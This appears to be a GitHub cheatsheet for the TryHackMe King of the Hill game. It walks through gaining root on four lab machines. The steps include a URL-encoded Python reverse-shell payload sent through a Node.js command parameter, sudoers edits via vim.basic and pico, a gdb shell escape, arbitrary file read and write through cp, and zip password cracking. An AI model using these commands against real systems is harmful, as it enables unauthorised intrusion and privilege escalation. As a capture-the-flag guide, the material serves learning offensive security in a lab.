This a github cheatsheet of owning the machines in King of the Hill game of TryHackMe.


# Machine name: FOOD
NMAP scan with `-p-` revealed that there is a telnet running on port 46969. <br /> 

So following are the steps to get root, ASAP. <br /> 

1. Connect on the port: <br /> 
    `telnet <IP> 46969` <br /> 
2. The Username and password are in caesor cipher. <br /> 
    Username: food <br /> 
    Password: givemecookies <br /> 
3. After scanning the machine with linPEAS.sh, We found that `vim.basic` binary is vuln to read and write to privilaged files.
    `vim.basic /etc/sudoers` <br /> 
    Press i <br /> 
    Add this line after the line with `root` is the start. <br /> 
    `food ALL=(ALL:ALL) ALL` <br /> 
    Press Ctrl+[ <br /> 
    Press :w! Enter <br /> 
    Press :q! Enter <br /> 
    `sudo su` <br /> 
    In prompt enter the password of food, i.e.  `givemecookies` <br /> 
   #### YOU ARE ROOT. NOW DEFEND YOUR TITILE.
    


#  Machine name: SHREK

    
This is first and relatively easy machine, But beaware this things have too many entries to keep an eye on, Best Idea for defending this is by just killing the shells. Again I am not posting the methods that are 'technically' better, I am posting methods that will be easiest to do and will get you win.
Target is to win while being inside the rules. This is not an exam, there are no wrong answers.
As the saying goes, *If it works, don't touch it.*

1. Initial gobuster scan revealed that `robots.txt` file contains an abnormal entry, When we navigate to it, we find the entire RSA key.

![image](https://user-images.githubusercontent.com/54495695/81495768-495e6f80-92d0-11ea-8ab8-daab1abe3cf3.png)

2. Copy the key, paste it in a file, give the file necessary permissions.<br />
Assuming you made the RSA key file with the name `id_rsa`, follow these commands.<br />
`chmod 600 id_rsa`<br />
`ssh -i id_rsa shrek@<IP ADDRESS OF MACHINE>`<br />
This will give you a shell to shrek.<br />

3. After scanning the machine with linPEAS.sh, We found tha there is a gdb vulnerabilty in the box, using GTFObins, We use the following commands to do Privilage escalation.<br />
`gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit`<br />
  #### YOU ARE ROOT. NOW DEFEND YOUR TITILE.<br />
    
#  Machine name: SPACE JAM

This machine is race to root kind of thing, There is a very low hanging fruit to get root, But it is a way use only entry, i.e. Whoever uses it first will try his best to destory this entry as it is too open. <br />

1. As always we do the basic nmap scan.<br />
![image](https://user-images.githubusercontent.com/54495695/81496158-2a151180-92d3-11ea-9d72-110073c4fbac.png)

2. We can see port 3000 is hosting Nodejs openly, So we try to get the reverse shell from it.<br />
    To do that, First start a listener on your machine using these commands:<br />
       `ncat -lvnp 4444` // I am using ncat, since I am on a Arch based system, You can use `nc` inplace of ncat.<br />
     Once the listener is ready, we deploy the payload.<br />
3. After testing many payloads we found the one of python to be working, For more payloads, follow this link.<br />
    The payload:<br />
           REPLACE <REMOTE_IP> with the IP of box.<br />
           REPLACE <LOCAL_IP> with the IP of your tryhackme VPN.<br />
   
        curl "<REMOTE_IP>:3000/?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22<LOCAL_IP>%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27"

    On listener, you can see that we have a shell now.<br />
   
 4. After trying a lot of tests and linPEAS, I found that the easiest method to get king AND root shell is to exploit the `cp` vulnerability on the box. I am leaving the ideas to you for this one, but after making you king.<br />
 
    `LFILE=/root/king.txt`<br />
    `echo "<YOUR USERNAME>" | cp /dev/stdin "$LFILE"`<br />
#### YOU ARE KING. NOW DEFEND YOUR TITILE.<br />
Free Tip: (You know you can read anyfile with this vuln, use your imagination.)<br />
    `LFILE=file_to_read`<br />
    `cp "$LFILE" /dev/stdout`<br />

#  Machine name: FORTUNE

Now this is new machine, Released very recently, 
And made it hard for me to post direct commands, Why?
Heres why, In this machine, there's a thing called autogen script, that regenrates everything at every reset. That means direct credentials doesn't work anymore. So you have to follow the instructions and do everything manually.
Let's Hack:


1. Initial nmap scans revealed that theres a netcat port open at 3333. 
    ![image](https://user-images.githubusercontent.com/54495695/81497074-b9252800-92d9-11ea-9e85-e727773fc41c.png)

2. When we connect to it, It gives out a weird base64 hash, After fiddling around, I found that it is base data of a zip file, so we use this [Site](https://base64.guru/converter/decode/file).
    Copy the base64 hash to this site, and it will generate a file named application.zip.
    
3. Now when we try to open the file, The file needs a password, Just crack this file using fcrackzip and wordlist rockyou.txt.
    `fcrackzip -v -u -D -p ~/wordlists/rockyou.txt application.zip`
   Once you have the password, unzip it.
   `unzip application.zip`
   You get a file named creds.txt, Inside it we have the login details of user named `fortuna`. Lets GO.
4. Using the creds, 
    `ssh fortuna@<BOX IP>`
5. Now that we have the shell, We can work on Privilage escalation.
    After linpeas and basic test, I found that:
        5.1 We as fortuna are in sudoers list.
        5.2 And we also have `pico` in the `sudo -l` list.
        
6. We can simply edit the `/etc/sudoers/` file to give us ALL permissions to run sudo.
7. Using this command:
    `sudo pico /etc/sudoers`
   Replace `pico` in sudoers file with `ALL`.
8. Now you can just do, `sudo su` and you are root.

#### You are ROOT, now defend your title.
   
   
